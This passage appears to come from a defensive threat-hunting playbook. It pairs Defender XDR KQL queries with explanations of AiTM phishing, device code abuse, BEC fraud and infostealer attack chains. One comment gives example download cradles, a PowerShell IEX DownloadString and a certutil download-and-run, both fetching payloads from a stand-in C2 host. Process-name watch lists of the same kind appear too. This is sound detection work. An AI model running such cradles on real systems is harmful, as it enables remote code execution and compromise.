        goal: "Locate the phishing email that initiated the attack. AiTM (Adversary-in-the-Middle) lures are engineered to look like legitimate Microsoft security alerts or O365 service notifications — subjects like 'Unusual sign-in activity', 'Your password is expiring', or 'Action required'. The critical difference from generic phishing is that the link leads to an attacker-controlled reverse proxy (commonly built on EvilGinx2, Modlishka, or Muraena) rather than a fake login page. The proxy relays everything in real time to the real Microsoft login, so the victim authenticates successfully and MFA is completed — the proxy just intercepts the resulting session cookie. Because the link domain is attacker-controlled, it often doesn't match Microsoft domains, but may closely resemble them. Check ThreatTypes — MDO may have already flagged it as Phish if the domain has been seen in other campaigns.",
        pivotColumns: ["NetworkMessageId", "SenderFromAddress", "SenderIPv4", "RecipientEmailAddress", "DeliveryAction", "ThreatTypes"],
        kql: `EmailEvents
| where Timestamp > ago(14d)
| where DeliveryAction in ("Delivered", "DeliveredAsSpam")
// AiTM lures typically spoof Microsoft auth-related subjects
| where Subject has_any (
    "unusual sign-in", "sign-in attempt", "verify your account",
    "action required", "secure your account", "password expir",
    "MFA required", "authentication", "access suspended"
  )
  and SenderFromDomain !endswith "microsoft.com"
  and SenderFromDomain !endswith "yourdomain.com"
| project Timestamp, SenderFromAddress, SenderIPv4,
          SenderFromDomain, RecipientEmailAddress, Subject,
          DeliveryAction, ThreatTypes, NetworkMessageId
| sort by Timestamp desc
---
// Confirm the link destination — AiTM proxy domains are not microsoft.com
EmailUrlInfo
| where NetworkMessageId == "<id_from_EmailEvents>"
| where UrlDomain !endswith "microsoft.com"
    and UrlDomain !endswith "microsoftonline.com"
    and UrlDomain !endswith "office.com"
| project Timestamp, Url, UrlDomain, UrlLocation`,
      },
      {
        table: "UrlClickEvents",
        label: "The Click Through",
        goal: "Confirm the victim clicked the AiTM link and was proxied through the attacker's infrastructure. The UrlChain field is the most important evidence here — a legitimate Microsoft authentication flow does not redirect through third-party domains. In an AiTM attack, UrlChain will show the phishing link redirecting through the attacker's proxy domain before reaching login.microsoftonline.com. IsClickedThrough = true means Safe Links showed a warning and the user proceeded anyway. AccountUpn is the critical output of this stop — it's the identity you'll carry into every subsequent table.",
        pivotColumns: ["AccountUpn", "Url", "UrlChain", "ActionType", "IsClickedThrough", "NetworkMessageId", "IPAddress"],
        kql: `UrlClickEvents
| where Timestamp > ago(14d)
| where NetworkMessageId == "<id_from_EmailEvents>"
    or Url has "<proxy_domain_from_EmailUrlInfo>"
| project Timestamp, AccountUpn, Url, ActionType,
          IsClickedThrough, IPAddress, UrlChain, NetworkMessageId
| sort by Timestamp desc
---
// Hunt all victims of the same AiTM proxy domain
UrlClickEvents
| where Timestamp > ago(14d)
| where Url has "<proxy_domain>"
    or UrlChain has "<proxy_domain>"
| summarize
    VictimCount = dcount(AccountUpn),
    Victims     = make_set(AccountUpn),
    FirstSeen   = min(Timestamp),
    LastSeen    = max(Timestamp)
  by Url
| sort by VictimCount desc`,
      },
      {
        table: "AADSignInEventsBeta",
        label: "The Session Hijack",
        goal: "After the victim completes authentication through the AiTM proxy, Entra ID records a legitimate successful sign-in from the victim's IP. Simultaneously — within seconds to minutes — the attacker injects the stolen session cookie and Entra ID sees a second successful authenticated session for the same account from a completely different IP and often a different country. This second event may not trigger an MFA prompt because the cookie already carries the MFA satisfaction claim. Look for: two successful sign-ins for the same account in a short window from different IPs, the attacker's sign-in from IsManaged = false on an unrecognised device, elevated RiskLevelDuringSignIn on the second event, and ConditionalAccessStatus = 'Success' despite the anomalous source (a gap to remediate). AccountObjectId from this table is your pivot into all subsequent cloud activity.",
        pivotColumns: ["AccountUpn", "AccountObjectId", "IPAddress", "Country", "IsManaged", "RiskLevelDuringSignIn", "ConditionalAccessStatus", "ErrorCode"],
        kql: `// Full sign-in history for the compromised account — compare the two events
AADSignInEventsBeta
| where Timestamp > ago(14d)
| where AccountUpn =~ "<AccountUpn_from_UrlClickEvents>"
| where ErrorCode == 0
| project Timestamp, AccountUpn, AccountObjectId,
          IPAddress, Country, Application,
          IsManaged, ConditionalAccessStatus,
          RiskLevelDuringSignIn, AuthenticationRequirement
| sort by Timestamp asc
---
// Detect the impossible travel — two IPs/countries in the same short window
AADSignInEventsBeta
| where Timestamp > ago(14d)
| where AccountUpn =~ "<AccountUpn>"
| where ErrorCode == 0
| summarize
    SignInCount = count(),
    IPs         = make_set(IPAddress),
    Countries   = make_set(Country),
    FirstSeen   = min(Timestamp),
    LastSeen    = max(Timestamp)
  by bin(Timestamp, 1h)
| where array_length(IPs) > 1 or array_length(Countries) > 1
| sort by FirstSeen desc`,
      },
      {
        table: "CloudAppEvents",
        label: "Azure Portal Recon",
        goal: "With the session cookie replayed, the attacker opens Azure Portal and begins enumerating resources to identify target VMs. This activity appears in CloudAppEvents filtered to Application = 'Microsoft Azure'. Look for a rapid sequence of ListVirtualMachines, Get Virtual Machine, ListResourceGroups, ListSubscriptions, and List Role Assignments — this reconnaissance pattern happens in seconds and is characteristic of an attacker running an enumeration script rather than manually browsing the portal. Note the IPAddress in these events — it belongs to the attacker and differs from the victim's sign-in IP from the previous step. ObjectName will reveal the names of VMs and resource groups the attacker inspected.",
        pivotColumns: ["AccountObjectId", "AccountUpn", "Application", "ActionType", "IPAddress", "ObjectName"],
        kql: `CloudAppEvents
| where Timestamp > ago(14d)
| where AccountObjectId == "<AccountObjectId_from_AADSignIn>"
| where Application == "Microsoft Azure"
| where ActionType in (
    "UserLoggedIn",
    "ListVirtualMachines",
    "Get Virtual Machine",
    "ListResourceGroups",
    "ListSubscriptions",
    "List Role Assignments",
    "ListStorageAccounts",
    "GetKeyVaultSecret"
  )
| project Timestamp, Application, ActionType,
          IPAddress, UserAgent, ObjectName, ObjectId, RawEventData
| sort by Timestamp asc
---
// Hunt by the attacker's IP for any other accounts they accessed
CloudAppEvents
| where Timestamp > ago(14d)
| where IPAddress == "<attacker_IP>"
| where Application == "Microsoft Azure"
| summarize
    Actions  = make_set(ActionType),
    Accounts = make_set(AccountUpn),
    Objects  = make_set(ObjectName)
  by IPAddress, bin(Timestamp, 5m)
| sort by Timestamp asc`,
      },
      {
        table: "CloudAuditEvents",
        label: "Run Command Execution",
        goal: "The attacker selects a target VM and uses Azure's Run Command feature (or Custom Script Extension) to execute arbitrary code with SYSTEM-level privileges without needing RDP or network access. This is the crown jewel of Azure post-compromise: it requires only Azure RBAC permissions (Contributor or VM Contributor), leaves no interactive session, and can reach VMs behind private networking. In CloudAuditEvents the action appears as 'Microsoft.Compute/virtualMachines/runCommand/action'. The AdditionalFields JSON contains the command script — parse it to recover the download cradle. ResourceId reveals exactly which VM was targeted. Custom Script Extension writes appear as 'Microsoft.Compute/virtualMachines/extensions/write' and are a persistence-capable variant.",
        pivotColumns: ["ActionType", "AccountUpn", "AccountId", "ResourceId", "IPAddress"],
        kql: `CloudAuditEvents
| where Timestamp > ago(14d)
| where AccountUpn =~ "<AccountUpn_from_CloudAppEvents>"
    or AccountId == "<AccountObjectId>"
// Run Command and extension-based execution
| where ActionType has_any (
    "runCommand",
    "Microsoft.Compute/virtualMachines/runCommand/action",
    "Microsoft.Compute/virtualMachines/extensions/write",
    "CustomScriptExtension",
    "microsoft.compute/virtualmachines/runcommand"
  )
| extend CommandDetails = parse_json(AdditionalFields)
| project Timestamp, ActionType, ResourceId, ResourceType,
          IPAddress, AccountUpn,
          CommandDetails, AdditionalFields
| sort by Timestamp asc`,
      },
      {
        table: "CloudProcessEvents",
        label: "Download Cradle",
        goal: "When Run Command fires, the Azure Guest Agent spawns the attacker's script as a child process inside the VM. This is captured in CloudProcessEvents if Microsoft Defender for Cloud (Defender for Servers) is onboarded on the VM. The ProcessCommandLine is the smoking gun — download cradles are typically PowerShell one-liners using Net.WebClient.DownloadString(), IEX(), certutil -urlcache, bitsadmin /transfer, or curl piped to execution. The URL in the command line points to the attacker's staging server or C2 framework (Cobalt Strike, Sliver, Havoc). InitiatingProcessFileName will be WindowsAzureGuestAgent.exe or waagent on Linux — any child process of these agents warrants immediate investigation. Extract the malware URL from ProcessCommandLine to pivot to threat intel and DeviceNetworkEvents.",
        pivotColumns: ["FileName", "ProcessCommandLine", "InitiatingProcessFileName", "DeviceName", "AccountName"],
        kql: `CloudProcessEvents
| where Timestamp > ago(14d)
| where DeviceName == "<VM_name_from_CloudAuditEvents>"
// Azure Run Command spawns via these agents
| where InitiatingProcessFileName in~ (
    "WindowsAzureGuestAgent.exe",
    "WaAppAgent.exe",
    "waagent",
    "CustomScriptHandler",
    "GuestProxyAgent.exe"
  )
// The download cradle executables
| where FileName in~ (
    "powershell.exe", "pwsh.exe", "cmd.exe",
    "wscript.exe", "cscript.exe", "mshta.exe",
    "certutil.exe", "bitsadmin.exe",
    "curl.exe", "wget.exe"
  )
| project Timestamp, DeviceName, FileName,
          ProcessCommandLine, InitiatingProcessFileName,
          InitiatingProcessCommandLine, AccountName
| sort by Timestamp asc
// ProcessCommandLine reveals the cradle, for example:
// powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://c2/stage')"
// certutil -urlcache -split -f http://c2/beacon.exe C:\Windows\Temp\b.exe && C:\Windows\Temp\b.exe`,
      },
      {
        table: "DeviceNetworkEvents",
        label: "C2 Callback",
        goal: "After the download cradle executes and the malware payload runs, it calls back to the attacker's C2 server. If the Azure VM is onboarded to Microsoft Defender for Endpoint (Defender for Servers Plan 2), those connections appear in DeviceNetworkEvents. Look for outbound connections from the process that ran the cradle — usually powershell.exe or the dropped malware binary — to external public IPs on unusual ports. Beaconing presents as many short connections at regular intervals to the same IP. Large outbound BytesSent values indicate active exfiltration. RemoteUrl may contain the C2 domain — search this against threat intel. Even a single confirmed C2 connection proves successful code execution and turns this from a cloud incident into a full endpoint compromise.",
        pivotColumns: ["RemoteIP", "RemoteUrl", "RemotePort", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceNetworkEvents
| where Timestamp > ago(14d)
| where DeviceName == "<VM_name_from_CloudProcessEvents>"
| where InitiatingProcessFileName in~ (
    "powershell.exe", "pwsh.exe", "cmd.exe",
    "<malware_filename_from_CloudProcessEvents>"
  )
  and RemoteIPType == "Public"
| summarize
    Connections = count(),
    FirstSeen   = min(Timestamp),
    LastSeen    = max(Timestamp),
    TotalSent   = sum(SentBytes),
    TotalRecv   = sum(ReceivedBytes)
  by RemoteIP, RemoteUrl, RemotePort, InitiatingProcessFileName
| extend BeaconingInterval = datetime_diff(
    "second", LastSeen, FirstSeen) / Connections
| sort by Connections desc
// BeaconingInterval near a round number (60s, 300s) = implant beacon jitter`,
      },
    ],
  },

  // ── Device Code Auth Flow Attack ──────────────────────────────────────────
  devicecode: {
    steps: [
      {
        table: "AlertInfo",
        label: "Triage Existing Detections",
        goal: "Before tracing the attack chain manually, check what Defender XDR already surfaced. Device code abuse generates signals across MDO (phishing lure), MDCA (anomalous token usage, impossible travel, inbox rule creation), and Entra ID Protection (risky sign-in). Each ServiceSource in AlertInfo tells you how far into the chain existing detections reach. Pull AlertEvidence for each alert to collect the confirmed account UPN and attacker IP — these seed every table in the investigation. Stages with no alert are detection coverage gaps. If alerts already span the full chain, pivoting to containment may be more urgent than completing the manual investigation.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `AlertInfo
| where Timestamp > ago(14d)
| where Category in (
    "InitialAccess", "CredentialAccess",
    "Persistence", "Exfiltration", "Collection"
  )
  or Title has_any (
    "device code","token theft","suspicious sign",
    "impossible travel","inbox rule","mail forwarding",
    "anomalous token","risky sign","OAuth"
  )
| project Timestamp, AlertId, Title, Severity,
          Category, AttackTechniques, ServiceSource
| sort by Timestamp desc
---
// Get evidence entities to seed downstream pivots
AlertEvidence
| where AlertId in ("<AlertId1>","<AlertId2>")
    and EntityType in ("User","Ip","CloudLogonRequest")
| project Timestamp, AlertId, EntityType, EvidenceRole,
          AccountUpn, AccountObjectId, RemoteIP`,
      },
      {
        table: "EmailEvents",
        label: "Find the Lure",
        goal: "Locate the phishing message that convinced the victim to visit microsoft.com/devicelogin and enter an attacker-controlled code. Unlike traditional phishing, there is no fake login page — the email points to a real Microsoft URL, so it often bypasses link-scanning controls. Lures typically impersonate IT helpdesks ('your device needs re-authentication'), Microsoft security alerts ('unusual sign-in detected'), or collaboration tool invites. The tell is the instruction to visit devicelogin and manually enter a short alphanumeric code. Note: lures are also delivered via Teams DMs and LinkedIn — those won't appear here, but the subsequent auth event will still show in AADSignInEventsBeta.",
        pivotColumns: ["NetworkMessageId", "SenderFromAddress", "SenderIPv4", "RecipientEmailAddress", "DeliveryAction"],
        kql: `// Check EmailUrlInfo for device login URLs, then join to delivery event
EmailUrlInfo
| where Timestamp > ago(14d)
| where Url has "microsoft.com/devicelogin"
    or Url has "login.microsoftonline.com/common/oauth2/deviceauth"
| join kind=inner (
    EmailEvents
    | where DeliveryAction in ("Delivered", "DeliveredAsSpam")
    | project NetworkMessageId, Timestamp, SenderFromAddress,
              SenderIPv4, RecipientEmailAddress, Subject,
              DeliveryAction, ThreatTypes
) on NetworkMessageId
| project Timestamp, SenderFromAddress, SenderIPv4,
          RecipientEmailAddress, Subject, Url,
          DeliveryAction, NetworkMessageId
| sort by Timestamp desc
---
// Broader subject-line hunt if URL isn't in the body
EmailEvents
| where Timestamp > ago(14d)
| where DeliveryAction in ("Delivered", "DeliveredAsSpam")
| where Subject has_any (
    "device code", "verify your device",
    "authentication required", "re-authenticate",
    "access code", "login code"
  )
  and SenderFromDomain !endswith "yourdomain.com"
| project Timestamp, SenderFromAddress, SenderIPv4,
          RecipientEmailAddress, Subject, ThreatTypes,
          NetworkMessageId
| sort by Timestamp desc`,
      },
      {
        table: "AADSignInEventsBeta",
        label: "The Token Hand-off",
        goal: "This is the pivotal event in the entire attack chain. When the victim navigates to microsoft.com/devicelogin and enters the attacker's code, Entra ID records an interactive sign-in here — from the victim's IP, with MFA fully satisfied. Simultaneously, the attacker's polling script receives the access token and refresh token without any sign-in record of its own. Key red flags: successful MFA completion on an unmanaged device (IsManaged = false), an application the user would not normally sign in to, or a sign-in from a location consistent with the user but followed immediately by cloud activity from a completely different IP — that IP mismatch is the attacker using the stolen token. Review ConditionalAccessStatus to determine if a CA policy that should have blocked the flow was absent.",
        pivotColumns: ["AccountUpn", "AccountObjectId", "IPAddress", "ApplicationId", "ErrorCode", "IsManaged", "ConditionalAccessStatus"],
        kql: `// Find successful MFA completions on unmanaged devices (device code pattern)
AADSignInEventsBeta
| where Timestamp > ago(14d)
| where ErrorCode == 0                              // Successful auth
| where IsManaged == false                          // Not a corp-managed device
| where AuthenticationRequirement == "multiFactorAuthentication"
| project SignInTime=Timestamp, AccountUpn,
          AccountObjectId, SignInIP=IPAddress,
          Application, ApplicationId, Country,
          IsManaged, ConditionalAccessStatus,
          RiskLevelDuringSignIn
| sort by SignInTime desc
---
// Confirm the IP mismatch: token issued to victim's IP, used from attacker's IP
let SuspiciousSignIns =
    AADSignInEventsBeta
    | where Timestamp > ago(14d)
    | where ErrorCode == 0
        and IsManaged == false
        and AuthenticationRequirement == "multiFactorAuthentication"
    | project SignInTime=Timestamp, AccountObjectId,
              AccountUpn, SignInIP=IPAddress;
SuspiciousSignIns
| join kind=inner (
    CloudAppEvents
    | where Timestamp > ago(14d)
    | project ActionTime=Timestamp, AccountObjectId,
              ActionIP=IPAddress, ActionType, Application
) on AccountObjectId
| where ActionTime between (SignInTime .. (SignInTime + 1h))
| where SignInIP != ActionIP             // Token used from a different IP
| project SignInTime, ActionTime, AccountUpn,
          SignInIP, ActionIP, Application, ActionType
| sort by SignInTime desc`,
      },
      {
        table: "CloudAppEvents",
        label: "Mailbox Pillage",
        goal: "Within minutes of obtaining the token, most device code attacks pivot straight to the mailbox. MailItemsAccessed is the primary indicator — the attacker silently reads emails, searches for password reset messages, invoices, MFA backup codes, or credentials in mail threads. Watch especially for inbox rule creation (New-InboxRule, Set-Mailbox) which gives the attacker a persistent, silent copy of all incoming email — even after the access token expires. AnonymousLinkCreated on SharePoint or OneDrive files is the exfiltration signal. Run this query sorted ascending to watch the attack unfold in chronological order.",
        pivotColumns: ["AccountObjectId", "AccountUpn", "Application", "ActionType", "IPAddress"],
        kql: `CloudAppEvents
| where Timestamp > ago(14d)
| where AccountObjectId == "<AccountObjectId_from_AADSignIn>"
| where ActionType in (
    "MailItemsAccessed",
    "Send",
    "MoveToDeletedItems",
    "HardDelete",
    "SearchQueryInitiatedExchange",  // Searched the mailbox
    "FileDownloaded",
    "FileSyncDownloadedFull",
    "AnonymousLinkCreated",          // Exfil via share link
    "New-InboxRule",                 // Persistent forwarding — CRITICAL
    "Set-Mailbox",                   // Forward all mail externally
    "Add-MailboxPermission"          // Delegate access for later
  )
| project Timestamp, Application, ActionType,
          IPAddress, UserAgent, ObjectName, RawEventData
| sort by Timestamp asc`,
      },
      {
        table: "GraphApiAuditEvents",
        label: "API Enumeration",
        goal: "Sophisticated actors skip the GUI entirely and use the stolen token to call Microsoft Graph API directly via scripts or toolkits. This produces high-volume programmatic reads of mail, calendars, OneDrive, users, and group memberships — often faster than any human could navigate the UI. The source IP here will be the attacker's (different from the victim's sign-in IP). High call rates against user and directory endpoints in a short window indicate automated tooling such as GraphRunner, TokenTactician, or custom Python scripts. Look for calls to /users, /groups, /me/messages, /me/drive, and /servicePrincipals — these are the most commonly enumerated resources.",
        pivotColumns: ["AccountId", "AccountUpn", "ActionType", "IPAddress", "AdditionalFields"],
        kql: `// View all Graph API calls from the compromised account
GraphApiAuditEvents
| where Timestamp > ago(14d)
| where AccountId == "<AccountObjectId_from_AADSignIn>"
    or AccountUpn =~ "<AccountUpn>"
| project Timestamp, ActionType, IPAddress,
          TargetResources, AdditionalFields
| sort by Timestamp asc
---
// Detect automated bulk enumeration by volume
GraphApiAuditEvents
| where Timestamp > ago(14d)
| where IPAddress == "<attacker_IP_from_CloudAppEvents>"
| summarize
    CallCount  = count(),
    Operations = make_set(ActionType),
    Accounts   = dcount(AccountId)
  by bin(Timestamp, 5m), IPAddress
| where CallCount > 15
| sort by Timestamp asc`,
      },
      {
        table: "CloudAuditEvents",
        label: "Azure Resource Escalation",
        goal: "If the token was requested with Azure Resource Manager (ARM) scope — or if the attacker uses a separate token for ARM after gaining persistence — they can interact directly with Azure subscriptions. Look for VM listing and enumeration (Microsoft.Compute reads), role assignment changes (Microsoft.Authorization writes), Key Vault secret reads (Microsoft.KeyVault/vaults/secrets), and storage blob access. Adding themselves as Contributor or Owner on a subscription is a persistence mechanism that survives password resets. If you see RunCommand or extension/write operations, the attacker has achieved code execution inside Azure VMs.",
        pivotColumns: ["AccountUpn", "AccountId", "ActionType", "IPAddress"],
        kql: `CloudAuditEvents
| where Timestamp > ago(14d)
| where AccountUpn =~ "<AccountUpn_from_CloudAppEvents>"
    or AccountId == "<AccountId>"
| where ActionType has_any (
    "Microsoft.Compute/virtualMachines",
    "Microsoft.Storage/storageAccounts",
    "Microsoft.KeyVault/vaults/secrets",
    "Microsoft.Authorization/roleAssignments",
    "Microsoft.Resources/subscriptions",
    "runCommand",
    "extensions/write"
  )
| project Timestamp, ActionType, ResourceId, ResourceType,
          IPAddress, AccountUpn, AdditionalFields
| sort by Timestamp asc`,
      },
    ],
  },

  // ── AiTM → BEC Fraud ─────────────────────────────────────────────────────
  becfraud: {
    steps: [
      {
        table: "AlertInfo",
        label: "Triage Existing Detections",
        goal: "Before walking the kill chain, check what Defender XDR already knows. BEC and AiTM attacks generate signals across MDO (phishing lure, anomalous send volume), MDCA (impossible travel, inbox rule creation, suspicious sign-in), and MDI (unusual auth patterns). Use confirmed AlertEvidence IOCs — the compromised UPN and attacker IP — to anchor every subsequent query. Stages with no alert are detection coverage gaps worth documenting.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `AlertInfo
| where Timestamp > ago(14d)
| where Title has_any (
    "AiTM","impossible travel","token theft",
    "inbox rule","mail forwarding","BEC",
    "suspicious sign-in","anomalous send")
  or Category in ("InitialAccess","Persistence","Collection","Exfiltration")
| project Timestamp, AlertId, Title, Severity,
          Category, AttackTechniques, ServiceSource
| sort by Timestamp desc
---
AlertEvidence
| where AlertId in ("<AlertId1>","<AlertId2>")
    and EntityType in ("User","Ip","Mailbox")
| project Timestamp, AlertId, EntityType, EvidenceRole,
          AccountUpn, AccountObjectId, RemoteIP`,
      },
      {
        table: "EmailEvents",
        label: "Find the AiTM Lure",
        goal: "The BEC chain always starts with an email. The attacker needs to steal an MFA-satisfied session cookie, so the lure impersonates a Microsoft authentication prompt, a shared document notification, or a finance alert. The key tell is a non-Microsoft sender domain pointing to a URL that is not login.microsoftonline.com but behaves identically — it's an attacker-controlled reverse proxy. Check ThreatTypes: MDO may have already stamped it as Phish if the proxy domain has prior reputation.",
        pivotColumns: ["NetworkMessageId", "SenderFromAddress", "SenderIPv4", "RecipientEmailAddress", "ThreatTypes"],
        kql: `EmailEvents
| where Timestamp > ago(14d)
| where DeliveryAction in ("Delivered","DeliveredAsSpam")
| where Subject has_any (
    "sign-in","verify","MFA","invoice","payment",
    "authentication","action required","review document")
  and SenderFromDomain !endswith "microsoft.com"
| project Timestamp, SenderFromAddress, SenderFromDomain,
          RecipientEmailAddress, Subject,
          DeliveryAction, ThreatTypes, NetworkMessageId
| sort by Timestamp desc`,
      },
      {
        table: "UrlClickEvents",
        label: "Confirm the Proxy Click",
        goal: "The UrlChain field is the critical differentiator between AiTM and normal phishing. In AiTM, the chain shows the phishing link redirecting through the attacker's proxy domain before arriving at login.microsoftonline.com. The victim sees a legitimate Microsoft login page and completes MFA normally — the proxy intercepts the resulting session cookie. AccountUpn from this table is your identity anchor for every subsequent query. IsClickedThrough = true means the user bypassed a Safe Links warning.",
        pivotColumns: ["AccountUpn", "Url", "UrlChain", "ActionType", "IsClickedThrough", "IPAddress"],
        kql: `UrlClickEvents
| where Timestamp > ago(14d)
| where NetworkMessageId == "<NetworkMessageId from EmailEvents>"
    or Url has "<proxy_domain from EmailUrlInfo>"
| project Timestamp, AccountUpn, Url, UrlChain,
          ActionType, IsClickedThrough, IPAddress, NetworkMessageId
| sort by Timestamp desc`,
      },
      {
        table: "AADSignInEventsBeta",
        label: "The Session Hijack",
        goal: "After the victim completes MFA through the proxy, Entra ID records a successful sign-in from the victim's IP. Within seconds to minutes, the attacker replays the stolen cookie and Entra ID records a second successful sign-in for the same account from a completely different IP — often a different country. The second sign-in carries no MFA challenge because the cookie already contains the MFA satisfaction claim. Look for: two successful sign-ins in a short window from different IPs, IsManaged = false on the attacker's session, and elevated RiskLevelDuringSignIn.",
        pivotColumns: ["AccountUpn", "AccountObjectId", "IPAddress", "Country", "IsManaged", "RiskLevelDuringSignIn", "ErrorCode"],
        kql: `AADSignInEventsBeta
| where Timestamp > ago(14d)
| where AccountUpn =~ "<AccountUpn from UrlClickEvents>"
    and ErrorCode == 0
| summarize SignIns = count(),
            IPs = make_set(IPAddress),
            Countries = make_set(Country)
    by AccountUpn, bin(Timestamp, 1h)
| where array_length(IPs) > 1
---
AADSignInEventsBeta
| where Timestamp > ago(14d)
| where AccountUpn =~ "<AccountUpn>"
    and IsManaged == false and ErrorCode == 0
| project Timestamp, AccountUpn, IPAddress, Country,
          Application, RiskLevelDuringSignIn, AccountObjectId`,
      },
      {
        table: "CloudAppEvents",
        label: "Inbox Rule Creation",
        goal: "The attacker's first priority is persistence and situational awareness: create inbox rules that hide security notification emails (move to Deleted Items, mark as read) and forward a silent copy of all incoming mail to an external address. New-InboxRule with ForwardTo pointing to a free email provider is a confirmed compromise indicator. Set-Mailbox with ForwardingSmtpAddress is an even more powerful persistence mechanism — it survives password resets. Parse RawEventData as JSON to extract the rule conditions and actions.",
        pivotColumns: ["AccountObjectId", "AccountUpn", "ActionType", "IPAddress", "RawEventData"],
        kql: `CloudAppEvents
| where Timestamp > ago(14d)
| where AccountObjectId == "<AccountObjectId from AADSignIn>"
| where ActionType in (
    "New-InboxRule","Set-InboxRule",
    "Set-Mailbox","Add-MailboxPermission",
    "New-TransportRule","Set-TransportRule")
| extend RuleDetails = parse_json(RawEventData)
| project Timestamp, AccountUpn, ActionType,
          IPAddress, UserAgent, RuleDetails, RawEventData
| sort by Timestamp asc`,
      },
      {
        table: "CloudAppEvents",
        label: "Mailbox Reconnaissance",
        goal: "With the inbox rule suppressing alerts, the attacker reads the victim's email to understand payment workflows, identify approvers, find in-flight vendor invoices, and locate banking details to substitute. MailItemsAccessed and SearchQueryInitiatedExchange in CloudAppEvents record this reconnaissance. A high volume of MailItemsAccessed operations in a short window from the attacker's IP is the signal. The attacker is specifically looking for the most recent invoice exchange with a vendor.",
        pivotColumns: ["AccountObjectId", "AccountUpn", "ActionType", "IPAddress", "ObjectName"],
        kql: `CloudAppEvents
| where Timestamp > ago(14d)
| where AccountObjectId == "<AccountObjectId>"
| where ActionType in (
    "MailItemsAccessed","SearchQueryInitiatedExchange",
    "FileDownloaded","FileSyncDownloadedFull")
| where IPAddress == "<attacker_IP from AADSignIn>"
| project Timestamp, Application, ActionType,
          IPAddress, UserAgent, ObjectName, RawEventData
| sort by Timestamp asc`,
      },
      {
        table: "EmailEvents",
        label: "The BEC Fraud Email",
        goal: "Armed with context from the victim's mailbox, the attacker sends a fraudulent email from the compromised account (or a lookalike domain) to the finance team or a vendor. The email references real invoice details and requests a bank account change or urgent wire transfer. It may arrive in a reply-all thread from the real conversation. EmailDirection == 'Outbound' from the compromised account with finance-related subjects is the detection pivot. The RecipientEmailAddress may be an external vendor — check if they were targeted in subsequent invoice fraud.",
        pivotColumns: ["SenderFromAddress", "RecipientEmailAddress", "Subject", "NetworkMessageId", "EmailDirection"],
        kql: `EmailEvents
| where Timestamp > ago(14d)
| where SenderFromAddress =~ "<compromised_account>"
    and EmailDirection == "Outbound"
| where Subject has_any (
    "invoice","payment","wire","bank account",
    "transfer","urgent","updated banking","remittance",
    "account details","new account")
| project Timestamp, SenderFromAddress, RecipientEmailAddress,
          Subject, DeliveryAction, NetworkMessageId
| sort by Timestamp desc`,
      },
      {
        table: "AlertInfo",
        label: "Detection Gap Analysis",
        goal: "⚠ NOTE — This is NOT a repeat of the opening triage step. The opening AlertInfo check seeds your investigation with known IOCs. This closing step answers a different question: now that you have traced every kill chain stage through raw telemetry, which stages actually fired an alert and which ones were invisible to Defender? That gap list is the primary deliverable for detection engineering. BEC attacks routinely complete with zero alerts: the AiTM proxy uses a fresh domain (no reputation), session cookie replay looks identical to a normal sign-in, and inbox rule creation is a legitimate Office 365 feature. Map each kill chain stage to its ServiceSource — or document 'no alert' — and hand the gaps to your detection team.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `AlertInfo
| where Timestamp > ago(14d)
| where Title has_any (
    "AiTM","impossible travel","token theft",
    "inbox rule","BEC","mail forwarding",
    "anomalous send","suspicious sign-in")
  or AttackTechniques has_any (
    "T1557","T1114","T1534","T1566","T1078")
| project Timestamp, AlertId, Title, Severity,
          Category, AttackTechniques, ServiceSource
| join kind=leftouter (
    AlertEvidence
    | where AccountUpn =~ "<compromised_upn>"
    | project AlertId, EvidenceRole, AccountUpn, RemoteIP
) on AlertId
| sort by Timestamp desc`,
      },
    ],
  },

  // ── Info Stealer Malware ──────────────────────────────────────────────────
  infostealer: {
    steps: [
      {
        table: "AlertInfo",
        label: "Triage Existing Detections",
        goal: "Before tracing the stealer manually, check what MDE already detected. Info stealers generate signals at multiple stages: download of the malware binary, DPAPI access by a non-browser process, browser credential database reads, and outbound connections to Telegram or Discord. Each alert tells you how far into the chain MDE's behavioral detections reached. Use AlertEvidence to get the stealer binary hash (SHA256) immediately — this becomes your primary pivot for scoping across all devices.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `AlertInfo
| where Timestamp > ago(7d)
| where Category in ("Malware","SuspiciousActivity","CredentialAccess")
  or Title has_any (
    "stealer","credential theft","browser data",
    "DPAPI","Lumma","Redline","StealC","Vidar",
    "Telegram","Discord C2","infostealer")
| project Timestamp, AlertId, Title, Severity,
          Category, AttackTechniques, ServiceSource
| sort by Timestamp desc
---
AlertEvidence
| where AlertId in ("<AlertId1>","<AlertId2>")
    and EntityType in ("File","Process","Ip","Machine")
| project Timestamp, AlertId, EntityType, EvidenceRole,
          FileName, SHA256, RemoteIP, DeviceName`,
      },
      {
        table: "DeviceProcessEvents",
        label: "Initial Execution",
        goal: "Info stealers arrive via malvertising (browser downloads a fake software installer), cracked software from third-party sites, or secondary payload delivery from a dropper like Amadey or MiniLoader. The initial execution often shows: a browser or explorer.exe as the parent process, the binary running from a Temp or Downloads path, a suspicious process name (often a copy of a legitimate app's name), and a SHA256 hash unknown to threat intel. Look for LOLBin chains where the downloaded file spawns cmd or PowerShell to execute the stealer in memory.",
        pivotColumns: ["SHA256", "FileName", "FolderPath", "ProcessCommandLine", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceProcessEvents
| where Timestamp > ago(7d)
| where FolderPath has_any (@"\Temp\",@"\AppData\Local\",@"\Downloads\")
    or InitiatingProcessFileName in~ (
        "chrome.exe","msedge.exe","firefox.exe",
        "explorer.exe","msiexec.exe")
| where FileName in~ (
    "powershell.exe","cmd.exe","mshta.exe",
    "wscript.exe","cscript.exe","regsvr32.exe","rundll32.exe")
    or SHA256 == "<known_stealer_hash>"
| project Timestamp, DeviceName, FileName, ProcessCommandLine,
          SHA256, FolderPath, InitiatingProcessFileName,
          InitiatingProcessCommandLine, AccountName`,
      },
      {
        table: "DeviceFileEvents",
        label: "Browser Credential Access",
